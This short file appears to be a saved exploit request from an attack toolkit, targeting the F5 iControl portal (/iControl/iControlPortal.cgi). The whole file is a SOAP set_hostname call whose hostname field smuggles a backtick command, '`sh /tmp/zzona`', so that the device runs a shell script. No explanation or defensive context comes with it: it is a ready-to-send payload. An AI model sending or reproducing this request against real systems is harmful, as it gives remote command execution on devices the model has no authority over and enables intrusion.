ExploitsMSF/F5/MSF/F5_icontrolExec_request.txt

array (
  'platform' => 'ALL',
  'service' => 'F5',
  'name' => 'F5_icontrolExec',
  'path' => '/iControl/iControlPortal.cgi',
  '<?xml_version' => '"1.0" encoding="ISO-8859-1"?>
      <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
      <SOAP-ENV:Body>
      <n1:set_hostname xmlns:n1="urn:iControl:System/Inet">
        <hostname>`sh /tmp/zzona`.a.b</hostname>
        </n1:set_hostname>
        </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>
    ',
)